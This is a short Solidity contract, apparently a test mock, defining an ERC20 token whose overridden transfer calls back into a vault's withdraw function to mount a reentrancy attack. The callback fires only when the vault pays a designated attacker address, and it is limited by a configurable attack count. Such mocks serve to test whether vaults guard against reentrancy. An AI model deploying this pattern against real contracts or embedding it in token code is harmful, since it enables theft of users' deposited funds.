// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IVault {
    function withdraw(uint256 shares) external returns (uint256 assets);
}

contract MaliciousToken is ERC20 {
    address public vault;
    address public attacker;
    bool public attacking;
    uint256 public attackCount;
    uint256 public maxAttacks = 3;
    uint256 public attackShares;

    constructor() ERC20("Malicious Token", "MAL") {
        _mint(msg.sender, 1_000_000 * 10 ** 18);
    }

    function setVault(address vault_) external {
        vault = vault_;
    }

    function setAttacker(address attacker_) external {
        attacker = attacker_;
    }

    function setAttackShares(uint256 shares_) external {
        attackShares = shares_;
    }

    function setAttacking(bool enabled) external {
        attacking = enabled;
    }

    function setMaxAttacks(uint256 max_) external {
        maxAttacks = max_;
    }

    function resetAttackCount() external {
        attackCount = 0;
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        _maybeAttack(to);
        return super.transfer(to, amount);
    }

    function _maybeAttack(address to) internal {
        if (!attacking) return;
        if (msg.sender != vault) return;
        if (to != attacker) return;
        if (attackCount >= maxAttacks) return;
        if (vault == address(0) || attackShares == 0) return;

        attackCount += 1;
        try IVault(vault).withdraw(attackShares) {
        } catch {
        }
    }
}
